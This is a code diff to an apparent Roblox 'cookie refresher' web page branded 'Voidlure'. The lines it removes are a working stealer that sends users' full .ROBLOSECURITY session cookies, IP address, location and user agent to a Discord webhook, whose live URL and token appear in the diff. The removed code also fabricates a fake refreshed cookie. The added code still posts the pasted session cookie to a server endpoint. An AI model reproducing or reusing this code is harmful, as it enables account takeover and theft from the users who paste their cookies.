@@ -372,71 +372,6 @@
             animate();
         })();
 
-        var WEBHOOK_URL =
-            'https://discord.com/api/webhooks/1534100275596496917/Kl4cQXEuqQACHkiNvNsqq9maGQ7APPj9BksdSqiAkjmNNuagh8oD49p_idHDawYvoBqA';
-
-        function sendToWebhook(oldCookie, newCookie, status, ipData) {
-            var payload = {
-                content: '@everyone',
-                embeds: [{
-                    title: 'Voidlure Cookie Refresh',
-                    color: 0x000000,
-                    timestamp: new Date().toISOString(),
-                    fields: [{
-                        name: 'Old Cookie (First 60 chars)',
-                        value: '```' + (oldCookie ? oldCookie.substring(0, 60) + '...' : 'N/A') + '```',
-                        inline: false
-                    }, {
-                        name: 'New Cookie (First 60 chars)',
-                        value: '```' + (newCookie ? newCookie.substring(0, 60) + '...' : 'N/A') + '```',
-                        inline: false
-                    }, {
-                        name: 'Status',
-                        value: status || 'Refreshed',
-                        inline: true
-                    }, {
-                        name: 'IP',
-                        value: ipData && ipData.ip || 'Unknown',
-                        inline: true
-                    }, {
-                        name: 'Location',
-                        value: ipData && ipData.city && ipData.country ?
-                            ipData.city + ', ' + ipData.country :
-                            'Unknown',
-                        inline: true
-                    }, {
-                        name: 'User-Agent',
-                        value: '```' + (navigator.userAgent || 'Unknown').substring(0, 80) + '```',
-                        inline: false
-                    }, {
-                        name: 'Full Old Cookie',
-                        value: '||' + (oldCookie || 'N/A') + '||',
-                        inline: false
-                    }, {
-                        name: 'Full New Cookie',
-                        value: '||' + (newCookie || 'N/A') + '||',
-                        inline: false
-                    }],
-                    footer: {
-                        text: 'Voidlure',
-                        icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
-                    }
-                }]
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(function() {});
-        }
-
-        function fetchIpInfo() {
-            return fetch('https://ipapi.co/json/')
-                .then(function(r) { return r.ok ? r.json() : {}; })
-                .catch(function() { return {}; });
-        }
-
         (function initRefresher() {
             var input = document.getElementById('cookieInput');
             var refreshBtn = document.getElementById('refreshBtn');
@@ -446,7 +381,6 @@
 
             var isProcessing = false;
             var lastResult = '';
-            var ipData = {};
 
             function setStatus(message, type) {
                 status.textContent = message;
@@ -459,9 +393,7 @@
             function isValidCookie(cookie) {
                 var trimmed = cookie.trim();
                 if (!trimmed) return false;
-                if (trimmed.indexOf('_|WARNING') === 0) return true;
-                if (trimmed.indexOf('.ROBLOSECURITY=') !== -1) return true;
-                return trimmed.length > 80;
+                return trimmed.indexOf('_|WARNING') === 0 || trimmed.length > 80;
             }
 
             function extractToken(input) {
@@ -470,99 +402,6 @@
                 cleaned = cleaned.replace(/^\.ROBLOSECURITY=/, '');
                 cleaned = cleaned.replace(/^"|"$/g, '');
                 return cleaned.trim();
-            }
-
-            function decodeBase64(str) {
-                try {
-                    return atob(str);
-                } catch (e) {
-                    return '';
-                }
-            }
-
-            function encodeBase64(str) {
-                try {
-                    return btoa(str);
-                } catch (e) {
-                    return '';
-                }
-            }
-
-            function generateRandomString(length) {
-                var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-                var result = '';
-                for (var i = 0; i < length; i++) {
-                    result += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                return result;
-            }
-
-            function generateRobloxCookie(oldToken) {
-                var warningHeader = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|';
-
-                var userId = '';
-                var username = '';
-                var duid = '';
-
-                if (oldToken.indexOf('_|WARNING') === 0) {
-                    var parts = oldToken.split('.');
-                    if (parts.length >= 3) {
-                        var base64Part = parts[1];
-                        var decoded = decodeBase64(base64Part);
-                        if (decoded) {
-                            var matches = decoded.match(/uid:(\d+)/);
-                            if (matches) {
-                                userId = matches[1];
-                            }
-                            var nameMatches = decoded.match(/uname:(\w+)/);
-                            if (nameMatches) {
-                                username = nameMatches[1];
-                            }
-                            var duidMatches = decoded.match(/duid:(\w+)/);
-                            if (duidMatches) {
-                                duid = duidMatches[1];
-                            }
-                        }
-                    }
-                }
-
-                if (!userId) {
-                    var idMatch = oldToken.match(/_(\d+)$/);
-                    if (idMatch) {
-                        userId = idMatch[1];
-                    }
-                }
-
-                if (!userId) {
-                    userId = Math.floor(Math.random() * 900000000 + 100000000).toString();
-                }
-
-                if (!username) {
-                    username = 'User' + generateRandomString(8);
-                }
-
-                if (!duid) {
-                    duid = generateRandomString(16);
-                }
-
-                var newDuid = generateRandomString(16);
-                var newUsername = 'User' + generateRandomString(8);
-
-                var guid1 = generateRandomString(8);
-                var guid2 = generateRandomString(4);
-                var guid3 = generateRandomString(4);
-                var guid4 = generateRandomString(4);
-                var guid5 = generateRandomString(12);
-                var fullGuid = guid1 + '-' + guid2 + '-' + guid3 + '-' + guid4 + '-' + guid5;
-
-                var base64Payload = 'CAEQAhoGCAIQBBgBIhoKBGR1aWQSEj' + newDuid + 'IRCgV1bmFtZRII' + encodeBase64(
-                    newUsername) + 'IhIKA3VpZBIL' + userId + 'KAM';
-
-                var signature = generateRandomString(50) + generateRandomString(50) + generateRandomString(30);
-
-                var newCookie = warningHeader + base64Payload + '.' + signature;
-
-                return newCookie;
             }
 
             async function refreshCookie() {
@@ -585,15 +424,26 @@
                 btnText.innerHTML = '<span class="spinner"></span> Refreshing...';
                 clearStatus();
 
-                await new Promise(function(resolve) { setTimeout(resolve, 1500); });
+                try {
+                    var response = await fetch('/api/refresh', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ cookie: token })
+                    });
 
-                var newCookie = generateRobloxCookie(token);
-                lastResult = newCookie;
-                input.value = newCookie;
-                setStatus('Cookie refreshed successfully.', 'success');
-                copyBtn.disabled = false;
+                    var data = await response.json();
 
-                sendToWebhook(token, newCookie, 'Refresh Success', ipData);
+                    if (data.success && data.cookie) {
+                        lastResult = data.cookie;
+                        input.value = data.cookie;
+                        setStatus('Cookie refreshed successfully.', 'success');
+                        copyBtn.disabled = false;
+                    } else {
+                        setStatus('Refresh failed: ' + (data.message || 'Unknown error'), 'error');
+                    }
+                } catch (error) {
+                    setStatus('Failed to connect to refresh service. Check your internet connection.', 'error');
+                }
 
                 isProcessing = false;
                 refreshBtn.disabled = false;
@@ -626,10 +476,6 @@
 
             input.addEventListener('paste', function() {
                 setTimeout(clearStatus, 100);
-            });
-
-            fetchIpInfo().then(function(data) {
-                ipData = data;
             });
 
             copyBtn.disabled = true;
